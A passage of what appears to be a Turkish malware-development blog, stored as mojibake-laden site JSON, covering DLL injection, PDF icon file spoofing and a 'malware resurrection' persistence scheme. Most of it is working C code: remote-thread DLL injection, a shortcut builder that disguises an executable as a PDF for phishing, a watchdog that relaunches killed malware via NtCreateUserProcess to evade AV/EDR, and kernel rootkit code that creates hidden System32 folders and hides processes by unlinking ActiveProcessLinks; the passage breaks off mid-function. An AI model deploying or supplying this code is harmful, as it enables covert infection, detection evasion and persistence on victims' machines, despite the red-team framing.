yoluna ihtiyacÄ±mÄ±z olacak.\nÅimdi ise tekniÄŸimizi inceleyelim.\nDLL Injection ArtÄ±k temelde bir DLLâ€™in ne olduÄŸunu ve basitÃ§e kodlamasÄ±nÄ± biliyoruz.\nDLL Injection tekniÄŸi, bir process iÃ§erisine zararlÄ± DLLâ€™in enjekte edilmesi iÃ§erir. TÄ±pkÄ± Ã¶nceki konumuzda yaptÄ±ÄŸÄ±mÄ±z gibi zararlÄ± shellcodeâ€™u enjekte etmek gibi dÃ¼ÅŸÃ¼nÃ¼n.\nYÃ¼klenen zararlÄ± DLL ile artÄ±k amacÄ±nÄ±z ne ise ona gÃ¶re Processâ€™in davranÄ±ÅŸÄ±nÄ± deÄŸiÅŸtirebilirsiniz. KulaÄŸada ne kadar da sadece Malware Development iÃ§in kullanÄ±lan bir teknik gibi algÄ±lansa da debugging iÃ§in amaÃ§larla da kullanÄ±ldÄ±ÄŸÄ±nÄ± burada vurgulamak isterim.\nHatÄ±rlarsanÄ±z Ã¶nceki konumuzda elimizdeki shellcodeâ€™u hedef processâ€™e gÃ¶mÃ¼yorduk bellek aracÄ±lÄ±ÄŸÄ±yla. DediÄŸim gibi bu yÃ¶ntemi de bunun gibi dÃ¼ÅŸÃ¼nebilirsiniz. Hedef Process belleÄŸine DLLâ€™imizin yolunu gÃ¶meceÄŸiz ve ardÄ±ndan Processâ€™in LoadLibraryW Ã§alÄ±ÅŸtÄ±rmasÄ±nÄ± saÄŸlayarak zararlÄ± DLLâ€™i yÃ¼klemiÅŸ olacak.\nKod #include \u003cstdio.h\u003e #include \u003cWindows.h\u003e int main(int argc, char* argv[]) { DWORD PID = 0; HANDLE HandleProcess = NULL; HANDLE HandleThread = NULL; LPVOID RemoteBuffer = NULL; LPTHREAD_START_ROUTINE LoadLibraryAddress = NULL; wchar_t DllPath[MAX_PATH] = L\"C:\\\\Users\\\\bekoo\\\\bekoo.dll\"; DWORD DllPathSize = sizeof(DllPath); if (argc \u003c 2) { printf(\"Usage: %s \u003cPID\u003e\\n\", argv[0]); return 1; } PID = atoi(argv[1]); printf(\"Injecting DLL into PID %d\\n\", PID); LoadLibraryAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleW(L\"kernel32.dll\"), \"LoadLibraryW\"); if (LoadLibraryAddress == NULL) { printf(\"Failed to get LoadLibraryW address\\n\"); return 1; } printf(\"LoadLibraryW address: 0x%p\\n\", LoadLibraryAddress); HandleProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID); if (HandleProcess == NULL) { printf(\"Failed to open process\\n\"); return 1; } RemoteBuffer = VirtualAllocEx(HandleProcess, NULL, DllPathSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (RemoteBuffer == NULL) { printf(\"Failed to allocate memory in remote process\\n\"); return 1; } if (!WriteProcessMemory(HandleProcess, RemoteBuffer, DllPath, DllPathSize, NULL)) { printf(\"Failed to write DLL path to remote process\\n\"); return 1; } HandleThread = CreateRemoteThreadEx(HandleProcess, NULL, 0, LoadLibraryAddress, RemoteBuffer, 0, NULL, NULL); if (HandleThread == NULL) { printf(\"Failed to create remote thread\\n\"); return 1; } WaitForSingleObject(HandleThread, INFINITE); printf(\"DLL injected\\n\"); return 0; } EÄŸer Shellcode Execution blogumu okudu iseniz bu kodlar yabancÄ± gelmeyecektir. Ã‡Ã¼nkÃ¼ neredeyse aynÄ± ÅŸeyleri yapÄ±yoruz birkaÃ§ ÅŸey dÄ±ÅŸÄ±nda. Ã–nceki konuda LoadLibrary gibi ÅŸeyler kullanmadÄ±k. Åimdi buna bir bakalÄ±m:\nLoadLibraryAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleW(L\"kernel32.dll\"), \"LoadLibraryW\"); if (LoadLibraryAddress == NULL) { printf(\"Failed to get LoadLibraryW address\\n\"); return 1; } printf(\"LoadLibraryW address: 0x%p\\n\", LoadLibraryAddress); Burada GetProcAddress ile kernel32.dll iÃ§erisinden LoadLibraryW APIâ€™in adresini elde ediyoruz ve alÄ±nan adres LoadLibraryAddress deÄŸiÅŸkenine aktarÄ±lÄ±yor.\nDaha sonra bir if kontrolÃ¼ yapÄ±yoruz. EÄŸer GetProcAddress NULL dÃ¶ndÃ¼rmÃ¼ÅŸ ise fonksiyonun adresi alÄ±nmamÄ±ÅŸ demektir ve bu yÃ¼zden programÄ± bir hata mesajÄ± ile kapatÄ±yoruz. â€œEee? Bu adresi nerede kullanÄ±yoruz?â€ diye bir soru gelebilir hemen gÃ¶stereyim:\nHandleThread = CreateRemoteThreadEx(HandleProcess, NULL, 0, LoadLibraryAddress, RemoteBuffer, 0, NULL, NULL); if (HandleThread == NULL) { printf(\"Failed to create remote thread\\n\"); return 1; } Bu adresi, CreateRemoteThreadExâ€™in dÃ¶rdÃ¼ncÃ¼ parametresi olan lpStartAddressâ€™e ve ayrÄ±lan bellek adresini lpParameter olarak verdiÄŸime dikkat edin. Buradaki amacÄ±mÄ±z hedef Processâ€™e verilen adres, elde ettiÄŸimiz LoadLibraryW fonksiyonun adresidir. Bu fonksiyon kullanarak hazÄ±rladÄ±ÄŸÄ±mÄ±z DLLâ€™i yÃ¼klenmesi saÄŸlanacaktÄ±r. RemoteBuffer deÄŸeri ise LoadLibraryW fonksiyonu iÃ§in parametre olarak veriyoruz.\nDiÄŸer kod parÃ§alarÄ± zaten Ã¶nceki blogumda anlattÄ±ÄŸÄ±m gibi aynÄ±.\nSonuÃ§ SonuÃ§ta gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi paint uygulamasÄ±nÄ±n PID deÄŸerini verdiÄŸimizde DLLâ€™i enjekte ediyor ve mesajÄ±mÄ±zÄ± gÃ¶rÃ¼yoruz.\nUmarÄ±m sizler iÃ§in faydalÄ± olmuÅŸtur iyi Ã§alÄ±ÅŸmalar dilerimm.\nReferences Microsoft Learn - DLL nedir? ","sonuÃ§#\u003cstrong\u003eSonuÃ§\u003c/strong\u003e":""},"title":"DLL Injection"},"/tr/docs/malware-dev/file-icon-spoofing/":{"data":{"":"","code#Code":"","programÄ±-Ã§alÄ±ÅŸtÄ±rma#ProgramÄ± Ã‡alÄ±ÅŸtÄ±rma":"","references#References":"Merhabalar, bu yazÄ±da File Icon Spoofing tekniÄŸini inceleyeceÄŸiz.\nKÄ±saca tekniÄŸi Ã¶zetlemek gerekirse oluÅŸturulan malwareâ€™in programÄ±n iconâ€™u deÄŸiÅŸtirilerek kullanÄ±cÄ±yÄ± yanÄ±ltma tekniÄŸidir. Bu sayede kullanÄ±cÄ±, ilgili malwareâ€™i zararsÄ±z bir dosya olarak gÃ¶rebilir. Malware iÃ§in belirlediÄŸiniz icon, bu konuda Ã¶rnek olarak gÃ¶sterileceÄŸi gibi bir PDF olabilir veya bir baÅŸka icon olabilir. TekniÄŸin, sosyal mÃ¼hendislik saldÄ±rÄ±larÄ± iÃ§in oldukÃ§a etkili bir yÃ¶ntem olabilir ve ayrÄ±ca Pentest ve Red Team Ã§alÄ±ÅŸmalarÄ±nda da kullanÄ±lÄ±ÅŸlÄ± olabilir.\nKonunun daha iyi anlaÅŸÄ±lmasÄ± iÃ§in Ã¶rnek senaryo Ã¼zerinden ilerleyelim, bir ÅŸirketin iÃ§ aÄŸÄ±nÄ±n gÃ¼venliÄŸini test etmek amacÄ±yla gÃ¶revlendirilmiÅŸ bir pentester olduÄŸunuzu dÃ¼ÅŸÃ¼nÃ¼n. Åirket Ã§alÄ±ÅŸanlarÄ±nÄ±n kÃ¶tÃ¼ amaÃ§lÄ± dosyalarÄ± aÃ§ma konusunda ne kadar dikkatli olduklarÄ±nÄ± test etmeniz gerekiyor. Bu baÄŸlamda, kÃ¶tÃ¼ amaÃ§lÄ± yazÄ±lÄ±mÄ±nÄ±zÄ± zararsÄ±z bir PDF dosyasÄ± olarak maskeleyerek, bir kimlik avÄ± e-postasÄ± aracÄ±lÄ±ÄŸÄ±yla veya paylaÅŸÄ±lan bir klasÃ¶re yerleÅŸtirerek gÃ¶nderebilirsiniz. EÄŸer bir Ã§alÄ±ÅŸan bu dosyayÄ± aÃ§arsa, dosya aslÄ±nda zararlÄ± yazÄ±lÄ±mÄ± Ã§alÄ±ÅŸtÄ±rarak sistemlerine eriÅŸim saÄŸlar.\nCode Bu konu iÃ§in kullandÄ±ÄŸÄ±m kod parÃ§asÄ±, S12 H4CKâ€™in PDF Icon File Spoofing konusundan alÄ±nmÄ±ÅŸ ve tarafÄ±mca gÃ¼ncellenmiÅŸtir. Daha fazla detay iÃ§in Referanslar kÄ±smÄ±ndan makalesine gÃ¶z atabilirsiniz.\nHazÄ±rlanan Ã¶rnek kod parÃ§asÄ±nÄ±n github linkâ€™ine eriÅŸmek iÃ§in buraya tÄ±klayabilirsiniz.\n#include \u003cstdio.h\u003e #include \u003cstrsafe.h\u003e #include \u003cwchar.h\u003e #include \u003cShlObj.h\u003e #include \u003cobjbase.h\u003e #include \u003cWindows.h\u003e BOOL CreateShortcut(const wchar_t* TargetPath, const wchar_t* ShortcutPath, const wchar_t* IconPath ) { HRESULT HRES; IShellLink* PSL = NULL; IPersistFile* PPF = NULL; CoInitialize(NULL); HRES = CoCreateInstance(\u0026CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, \u0026IID_IShellLink, (void**)\u0026PSL); if (FAILED(HRES)) { wprintf(L\"Failed to create IShellLink Object! Error Code: 0x%08X\\n\", HRES); return 1; } PSL-\u003elpVtbl-\u003eSetPath(PSL, TargetPath); PSL-\u003elpVtbl-\u003eSetIconLocation(PSL, IconPath, 0); PSL-\u003elpVtbl-\u003eSetDescription(PSL, L\"Very important file\"); HRES = PSL-\u003elpVtbl-\u003eQueryInterface(PSL, \u0026IID_IPersistFile, (void**)\u0026PPF); if (FAILED(HRES)) { wprintf(L\"Failed to interface! Error Code: 0x%08X\\n\", HRES); return 1; } HRES = PPF-\u003elpVtbl-\u003eSave(PPF, ShortcutPath, TRUE); PPF-\u003elpVtbl-\u003eRelease(PPF); PSL-\u003elpVtbl-\u003eRelease(PSL); CoUninitialize(); wprintf(L\"Shortcut Created!\\n\"); return 0; } int main() { wchar_t TargetPath[MAX_PATH] = L\"C:\\\\Windows\\\\System32\\\\calc.exe\"; wchar_t IconPath[MAX_PATH] = L\"C:\\\\path\\\\to\\\\pdficon.ico\"; wchar_t ShortcutPath[MAX_PATH]; HRESULT HRFolder; HRFolder = SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, ShortcutPath); if (FAILED(HRFolder)) { wprintf(L\"Failed to get Desktop Path! Error Code: 0x%08X\\n\", HRFolder); return 1; } StringCchCatW(ShortcutPath, MAX_PATH, L\"\\\\Projects.lnk\"); wprintf(L\"Merged Path: %s\\n\", ShortcutPath); if (CreateShortcut(TargetPath, ShortcutPath, IconPath) \u003e 0) { wprintf(L\"Failed to create Shortcut!\\n\"); return -1; } return 0; } Kodlara detaylÄ±ca gÃ¶z atalÄ±m ve main iÃ§erisinden baÅŸlayalÄ±m:\nwchar_t TargetPath[MAX_PATH] = L\"C:\\\\Windows\\\\System32\\\\calc.exe\"; wchar_t IconPath[MAX_PATH] = L\"C:\\\\path\\\\to\\\\pdficon.ico\"; wchar_t ShortcutPath[MAX_PATH]; TargetPath: Bu deÄŸiÅŸken, oluÅŸturulacak kÄ±sayolun hedef dosyasÄ±nÄ±n yolunu belirtir. Bu deÄŸiÅŸken bizim malwareâ€™in yolunu belirtir. IconPath: Bu deÄŸiÅŸken, oluÅŸturulacak kÄ±sayolun iconâ€™unun yolunu belirtir. ShortcutPath: Bu deÄŸiÅŸken, oluÅŸturulacak kÄ±sayolun yolunu belirtir. HRFolder = SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, ShortcutPath); if (FAILED(HRFolder)) { wprintf(L\"Failed to get Desktop Path! Error Code: 0x%08X\\n\", HRFolder); return 1; } StringCchCatW(ShortcutPath, MAX_PATH, L\"\\\\Projects.lnk\"); wprintf(L\"Merged Path: %s\\n\", ShortcutPath); Bu kÄ±sÄ±mda ise ilk olarak SHGetFolderPath fonksiyonu ile desktop dizinin tam yolunu alÄ±yoruz. ArdÄ±ndan alÄ±nan dizin yoluna ise StringCchCatW aracÄ±lÄ±ÄŸÄ±yla oluÅŸturulacak kÄ±sayol ismi ile birleÅŸtiriyoruz. Bu sayede oluÅŸturulacak kÄ±sayolâ€™un tam yolunu elde etmiÅŸ oluyoruz.\nBu kÄ±sayol ismini Projects.lnk olarak ayarladÄ±m. Siz dilerseniz bunu deÄŸiÅŸtirebilirsiniz. if (CreateShortcut(TargetPath, ShortcutPath, IconPath) \u003e 0) { wprintf(L\"Failed to create Shortcut!\\n\"); return -1; } Bu kÄ±sÄ±mda ise oluÅŸturduÄŸumuz CreateShortcut fonksiyonunu Ã§aÄŸÄ±rÄ±yoruz ve if ile bir karÅŸÄ±laÅŸtÄ±rma yapÄ±yoruz. EÄŸer CreateShortcut fonksiyonu 0â€™dan yÃ¼ksek yani 1 deÄŸerini dÃ¶ndÃ¼rÃ¼rse hata mesajÄ± ekrana bastÄ±rarak -1 ile programÄ± return ettiriyoruz. CoInitialize(NULL); HRES = CoCreateInstance(\u0026CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, \u0026IID_IShellLink, (void**)\u0026PSL); if (FAILED(HRES)) { wprintf(L\"Failed to create IShellLink Object! Error Code: 0x%08X\\n\", HRES); return 1; } CreateShortcut fonksiyon iÃ§erisinde ise ilk olarak CoInitialize fonksiyonu ile COM bileÅŸenlerini baÅŸlatÄ±yoruz. Peki ama neden COM bileÅŸenlerini baÅŸlatÄ±yoruz?\nÃ‡Ã¼nkÃ¼ IShellLink ve IPersistFile interfaceâ€™leri COM bileÅŸenleridir. Bu interfaceâ€™ler bizim kÄ±sayol oluÅŸturmak iÃ§in kullanacaÄŸÄ±mÄ±z araÃ§lardÄ±r. DolayasÄ±yla bunlara eriÅŸmemiz iÃ§in COM bileÅŸenlerini baÅŸlatmamÄ±z gerekmektedir.\nArdÄ±ndan CoCreateInstance fonksiyonu ile IShellLink interfaceâ€™ini oluÅŸturuyoruz. EÄŸer bu iÅŸlem baÅŸarÄ±sÄ±z olursa hata mesajÄ± bastÄ±rarak programÄ± return ettiriyoruz. PSL-\u003elpVtbl-\u003eSetPath(PSL, TargetPath); PSL-\u003elpVtbl-\u003eSetIconLocation(PSL, IconPath, 0); PSL-\u003elpVtbl-\u003eSetDescription(PSL, L\"Very important file\"); HRES = PSL-\u003elpVtbl-\u003eQueryInterface(PSL, \u0026IID_IPersistFile, (void**)\u0026PPF); if (FAILED(HRES)) { wprintf(L\"Failed to interface! Error Code: 0x%08X\\n\", HRES); return 1; } Bu kod bloÄŸunda ise oluÅŸturduÄŸumuz IShellLink interfaceâ€™ine Target Path, Icon Path ve Description ekliyoruz. Bu adÄ±mlar, oluÅŸturacaÄŸÄ±mÄ±z kÄ±sayolun Ã¶zelliklerini belirtir.\nArdÄ±ndan QueryInterface fonksiyonu ile IPersistFile interfaceâ€™ine eriÅŸim saÄŸlÄ±yoruz. EÄŸer bu iÅŸlem baÅŸarÄ±sÄ±z olursa hata mesajÄ± bastÄ±rarak programÄ± return ettiriyoruz. HRES = PPF-\u003elpVtbl-\u003eSave(PPF, ShortcutPath, TRUE); PPF-\u003elpVtbl-\u003eRelease(PPF); PSL-\u003elpVtbl-\u003eRelease(PSL); CoUninitialize(); wprintf(L\"Shortcut Created!\\n\"); Son olarak ise Save fonksiyonu ile oluÅŸturduÄŸumuz kÄ±sayolu, main iÃ§erisinde oluÅŸturduÄŸumuz tam yoluna kaydediyoruz. ArdÄ±ndan IPersistFile ve IShellLink interfaceâ€™lerini serbest bÄ±rakÄ±yoruz. CoUninitialize fonksiyonu ile COM bileÅŸenlerini sonlandÄ±rÄ±yoruz. Son olarak kÄ±sayolun oluÅŸturulduÄŸuna dair bir mesaj bastÄ±rÄ±yoruz. ProgramÄ± Ã‡alÄ±ÅŸtÄ±rma ProgramÄ± Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±zda ise masaÃ¼stÃ¼nde kÄ±sayolumuz aÅŸaÄŸÄ±daki gibi gÃ¶zÃ¼kecektir:\nKÄ±sayolumuz aslÄ±nda pdf gibi gÃ¶zÃ¼kse de Ã¶zelliklerine gÃ¶z attÄ±ÄŸÄ±mÄ±zda aslÄ±nda farklÄ± bir program Ã§alÄ±ÅŸtÄ±racaktÄ±r:\nÃ–zelliklerine gÃ¶z attÄ±ÄŸÄ±mÄ±zda ise aslÄ±nda bu kÄ±sayolun calc.exe programÄ±nÄ± Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±nÄ± gÃ¶rmekteyiz.\nSonuÃ§ Bu konumda, icon file spoofing tekniÄŸini ele aldÄ±k. UnutmayÄ±n ki bu teknik, Pentest ve Red Team Ã§alÄ±ÅŸmalarÄ±nda da kullanÄ±lÄ±ÅŸlÄ± olabilir.\nUmarÄ±m faydalÄ± olmuÅŸtur, teÅŸekkÃ¼rler! ğŸš€\nReferences S12 H4CK - PDF Icon File Spoofing ","sonuÃ§#SonuÃ§":""},"title":"PDF Icon File Spoofing"},"/tr/docs/malware-dev/malware-resurrection/":{"data":{"":"","#":"Malware Resurrection Malware Resurrection tekniÄŸi, belirli malwareâ€™in sonlandÄ±rÄ±ldÄ±ktan sonra bile aktif kalmasÄ±nÄ± saÄŸlamak iÃ§in kullanÄ±lan bir kalÄ±cÄ±lÄ±k tekniÄŸinidir. Bu teknik, kÃ¶tÃ¼ amaÃ§lÄ± yazÄ±lÄ±mÄ±n kullanÄ±cÄ± tarafÄ±ndan kapatÄ±lmasÄ±, gÃ¼venlik yazÄ±lÄ±mÄ± tarafÄ±ndan sonlandÄ±rÄ±lmasÄ± veya bir hata nedeniyle Ã§Ã¶kmesi durumunda otomatik olarak yeniden baÅŸlatÄ±lmasÄ±nÄ± veya ana bilgisayarÄ± yeniden enfekte etmesini saÄŸlar.\nDiÄŸer bir deyiÅŸle, kÃ¶tÃ¼ amaÃ§lÄ± yazÄ±lÄ±m kendini â€œizlerâ€ veya yÃ¼rÃ¼tme durumunu izleyen ve artÄ±k Ã§alÄ±ÅŸmÄ±yorsa hemen yeniden baÅŸlatan bir yardÄ±mcÄ± iÅŸleme sahiptir.\nThe Project Projemde, her iki modun avantajlarÄ±ndan yararlanarak malware resurrection tekniÄŸini uygulamak iÃ§in bir rootkit ve bir usermode geliÅŸtirdim. Usermode program malwareâ€™i dinler ve eÄŸer malware sonlandÄ±rÄ±lÄ±rsa, yeniden baÅŸlatmak iÃ§in hemen diriltmek iÃ§in adÄ±mlara baÅŸlar. Rootkit, DKOM saldÄ±rÄ±larÄ± vb. yoluyla diriliÅŸ sÃ¼recini gÃ¼Ã§lendirir.\nÅema Ã¼zerinden gidebiliriz:\nListening the Malware from User Mode Program Ä°lk olarak usermode program, proje iÃ§erisindeki IsProcessRunning fonksiyonu ile malware processâ€™ini dinlemeye baÅŸlar:\nBOOLEAN IsProcessRunning(DWORD ProcessID) { HANDLE HandleProcessSnap = NULL; PROCESSENTRY32 PE32; BOOL Status = FALSE; HandleProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (INVALID_HANDLE_VALUE == HandleProcessSnap) { return FALSE; } PE32.dwSize = sizeof(PROCESSENTRY32); if (!Process32First(HandleProcessSnap, \u0026PE32)) { CloseHandle(HandleProcessSnap); return FALSE; } do { if (PE32.th32ProcessID == ProcessID) { Status = TRUE; break; } } while (Process32Next(HandleProcessSnap, \u0026PE32)); CloseHandle(HandleProcessSnap); return Status; } Fikir basit: Ã–nce Ã§alÄ±ÅŸan tÃ¼m processâ€™lerin snapshotâ€™Ä± alÄ±nÄ±yor, sonra Process32First ve Process32Next ile sÄ±rayla geziliyor. Her processâ€™in th32ProcessIDâ€™si hedef ProcessID ile karÅŸÄ±laÅŸtÄ±rÄ±lÄ±yor. EÄŸer eÅŸleÅŸme varsa Status TRUE oluyor ve dÃ¶ngÃ¼ kÄ±rÄ±lÄ±yor. HiÃ§ bulunamazsa FALSE kalÄ±yor.\nFonksiyon FALSE dÃ¶nerse, program devam edip gizli bir klasÃ¶r oluÅŸturuyor.\nCreating Hidden Folder Ä°lk adÄ±m olarak program rootkit ile baÄŸlantÄ± kuruyor ve rootkit System32 altÄ±nda gizli bir dosya oluÅŸturuyor. Rootkit kÄ±smÄ± oldukÃ§a basit. CreateHiddenFile fonksiyonundan:\nNTSTATUS CreateHiddenFile() { HANDLE HandleDirectory = NULL; HANDLE HandleFile = NULL; OBJECT_ATTRIBUTES ObjAttr; IO_STATUS_BLOCK IoStatusBlock; NTSTATUS Status; InitializeObjectAttributes(\u0026ObjAttr, \u0026G_ExecutablePath, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL); Status = ZwCreateFile(\u0026HandleDirectory, GENERIC_ALL, \u0026ObjAttr, \u0026IoStatusBlock, NULL, FILE_ATTRIBUTE_DIRECTORY | FILE_ATTRIBUTE_HIDDEN, \\ FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_CREATE, FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0); if (!NT_SUCCESS(Status)) { return Status; } ZwClose(HandleDirectory); return STATUS_SUCCESS; } Burada Object Attributes baÅŸlatÄ±lÄ±yor ve ardÄ±ndan ZwCreateFile Ã§aÄŸrÄ±larak gizli dosya oluÅŸturuluyor.\nCreating the Process Dosya oluÅŸturulduktan sonra, kullanÄ±cÄ± modu programÄ± NtCreateUserProcess ile bir iÅŸlem oluÅŸturur. DÃ¼rÃ¼st olmak gerekirse bunu rootkitâ€™te yapmadÄ±m.\nBu projeyi ilk geliÅŸtirmeye baÅŸladÄ±ÄŸÄ±mda, Ã§ekirdek modu sÃ¼rÃ¼cÃ¼sÃ¼nde ZwCreateProcessâ€™i bulmaya ve oluÅŸturmaya Ã§alÄ±ÅŸtÄ±m ve diÄŸer birÃ§ok yÃ¶ntemi denedim, ancak ne yazÄ±k ki hiÃ§biri benim iÃ§in iÅŸe yaramadÄ±. Daha sonra ZwCreateProcessEx gibi APIâ€™lerin Ã§ekirdek dÃ¼zeyinde processâ€™ler oluÅŸturmak iÃ§in kullanÄ±ldÄ±ÄŸÄ±nÄ± Ã¶ÄŸrendim ve Microwave90 kullanÄ±cÄ±sÄ±nÄ±n kernel tabanlÄ± driver projesinde uyguladÄ±ÄŸÄ± NtCreateUserProcess gibi diÄŸer yÃ¶ntemleri denedim, ancak boÅŸuna.\nDaha sonra yaptÄ±ÄŸÄ±m araÅŸtÄ±rmalarda Capt. Meeloâ€™nun blogunda NtCreateUserProcessâ€™in usermode programinda Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ± ile ilgili bir yazÄ± buldum ve aÃ§Ä±kÃ§asÄ± kod benim iÃ§in Ã§ok faydalÄ± oldu ve kullanÄ±cÄ± modu programÄ±ma sÃ¼reÃ§ oluÅŸturmayÄ± eklemeye karar verdim. Ä°ÅŸte kodlar:\nNTSTATUS CreateTargetProcess(UNICODE_STRING ImagePath, PHANDLE HandlePtr) { PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL; PPS_ATTRIBUTE_LIST AttrList; PS_CREATE_INFO CreateInfo = { 0 }; HANDLE HandleProcess = NULL; HANDLE HandleThread = NULL; NTSTATUS Status; Status = RtlCreateProcessParametersEx(\u0026ProcessParameters, \u0026ImagePath, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, \\ RTL_USER_PROCESS_PARAMETERS_NORMALIZED); if (!NT_SUCCESS(Status)) { return Status; } CreateInfo.Size = sizeof(CreateInfo); CreateInfo.State = PsCreateInitialState; AttrList = (PS_ATTRIBUTE_LIST*)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE)); AttrList-\u003eTotalLength = sizeof(PS_ATTRIBUTE_LIST) - sizeof(PS_ATTRIBUTE); AttrList-\u003eAttributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME; AttrList-\u003eAttributes[0].Size = ImagePath.Length; AttrList-\u003eAttributes[0].Value = (ULONG_PTR)ImagePath.Buffer; Status = NtCreateUserProcess(\u0026HandleProcess, \u0026HandleThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, NULL, ProcessParameters, \\ \u0026CreateInfo, AttrList); if (!NT_SUCCESS(Status)) { RtlFreeHeap(RtlProcessHeap(), 0, AttrList); RtlDestroyProcessParameters(ProcessParameters); return Status; } *HandlePtr = HandleProcess; RtlFreeHeap(RtlProcessHeap(), 0, AttrList); RtlDestroyProcessParameters(ProcessParameters); return STATUS_SUCCESS; } Usermodeâ€™dan CreateProcess Ã§aÄŸrÄ±sÄ± yaptÄ±ÄŸÄ±mÄ±zda aÅŸaÄŸÄ±daki adÄ±mlar iÅŸlenecektir:\nÄ°lk olarak kernel32â€™den CreateProcessInternal, ardÄ±ndan ntdll.dllâ€™den NtCreateUserProcess ve son olarak kernel moduna girerek ntoskrnl.exeâ€™den NtCreateUserProcess Ã§aÄŸrÄ±lÄ±r. Burada NtCreateUserProcessâ€™in kullanÄ±lmasÄ±nÄ±n nedeni, Meeloâ€™nun makalede bahsettiÄŸi gibi, AV/EDR tespit kontrollerinden kaÃ§mak iÃ§in kullanÄ±labilecek en dÃ¼ÅŸÃ¼k seviye API olmasÄ±dÄ±r.\nAncak dikkat ederseniz, NtCreateUserProcessâ€™i doÄŸrudan kod iÃ§inde Ã§aÄŸÄ±rmÄ±yoruz. Bundan Ã¶nce bazÄ± adÄ±mlarÄ± tamamlamamÄ±z ve ardÄ±ndan NtCreateUserProcessâ€™i Ã§aÄŸÄ±rmamÄ±z gerekiyor. Ã‡Ã¼nkÃ¼ Windows bir iÅŸlem oluÅŸtururken bazÄ± parametrelerin belirtilmesini bekler. Bu parametreler RTL_USER_PROCESS_PARAMETERS ve PS_ATTRIBUTE_LISTâ€™dir.\nRemoving the Malware from the Process List Process oluÅŸturulduktan sonra, rootkit processâ€™i process listesinden silecektir. Bunun iÃ§in DKOM attack tekniÄŸini kullanÄ±lacak:\nULONG GetActiveProcessLinkOffset() { ULONG MajorVersion = 0; ULONG MinorVersion = 0; ULONG BuildNumber = 0; NTSTATUS Status; Status = GetWindowsVersion(\u0026MajorVersion, \u0026MinorVersion, \u0026BuildNumber); if (!NT_SUCCESS(Status)) { return 0; } /* Note that these offset value (For 0x448) may change with future updates. */ if (10 == MajorVersion \u0026\u0026 22000 \u003e= BuildNumber) { /* The offset value 0x448 has been tested in Windows 10 and Windows 11. If the offset value 0x448 fails in the windows version you tried, you can find and change the offset of ActiveProcessLink with windbg. */ return 0x448; // For Win 10 and Win 11 } else if (10 == MajorVersion) { return 0x448; // For Win 10 and Win 11 } else if (6 == MajorVersion \u0026\u0026 3 == MinorVersion) { return 0x2e8; // For Win 8 } else if (6 == MajorVersion \u0026\u0026 1 == MinorVersion) { return 0x118; // For Win 7 } return 0; } NTSTATUS HideProcess(HANDLE ProcessID) { PLIST_ENTRY ActiveProcessLink; PEPROCESS Process; ULONG Offset; NTSTATUS Status; Status = PsLookupProcessByProcessId(ProcessID, \u0026Process); if (!NT_SUCCESS(Status)) { return Status; } Offset = GetActiveProcessLinkOffset(); if (0 == Offset) { return STATUS_NOT_SUPPORTED; } ActiveProcessLink = (PLIST_ENTRY)((PUCHAR)Process + Offset); RemoveEntryList(ActiveProcessLink); return STATUS_SUCCESS; } The Active Process Link Ã§ift baÄŸlÄ± liste olarak dÃ¼zenlenmiÅŸtir. Bu yapÄ±da, her kayÄ±t (veya node) iki pointer saklar: biri bir Ã¶nceki dÃ¼ÄŸÃ¼me, diÄŸeri de listedeki bir sonraki dÃ¼ÄŸÃ¼me. Bu pointerâ€™lar tÃ¼m dÃ¼ÄŸÃ¼mleri birbirine baÄŸlayarak her iki yÃ¶nde de geÃ§iÅŸe izin verir.\nWindows kernelâ€™da, Ã§ift baÄŸlantÄ±lÄ± bir listenin eÅŸdeÄŸeri aÅŸaÄŸÄ±daki gibi tanÄ±mlanan LIST_ENTRY veri yapÄ±sÄ± ile temsil edilir:\nkd\u003e dt _list_entry ntdll!_LIST_ENTRY +0x000 Flink : Ptr64 _LIST_ENTRY +0x008 Blink : Ptr64 _LIST_ENTRY Burada Flink (ileri baÄŸlantÄ±) ve Blink (geri baÄŸlantÄ±), standart bir Ã§ift baÄŸlantÄ±lÄ± listedeki Next ve Previous pointerlara karÅŸÄ±lÄ±k gelir. Projede, bu offset kullanÄ±larak, Processâ€™in PIDsine gÃ¶re aranÄ±r ve Flink ve Blink pointerlarÄ± gÃ¼ncellenerek listeden kaldÄ±rÄ±lÄ±r ve process sistem gÃ¶rÃ¼nÃ¼mlerinden etkili bir ÅŸekilde gizlenir.\nAÅŸaÄŸÄ±daki kod parÃ§acÄ±ÄŸÄ±, bir rootkitâ€™in ActiveProcessLink giriÅŸini listeden kaldÄ±rarak bir processâ€™i nasÄ±l gizleyebileceÄŸini gÃ¶stermektedir. Ä°lk olarak, kod, Windows sÃ¼rÃ¼mÃ¼ne baÄŸlÄ± olarak iÅŸlem yapÄ±sÄ± iÃ§indeki ActiveProcessLink ofsetini hesaplar, Ã§Ã¼nkÃ¼ bu ofsetler sÃ¼rÃ¼mler arasÄ±nda deÄŸiÅŸebilir:\nULONG GetActiveProcessLinkOffset() { ULONG MajorVersion = 0, MinorVersion = 0, BuildNumber = 0; NTSTATUS Status = GetWindowsVersion(\u0026MajorVersion, \u0026MinorVersion, \u0026BuildNumber); if (!NT_SUCCESS(Status)) return 0; if (MajorVersion == 10 \u0026\u0026 BuildNumber \u003c= 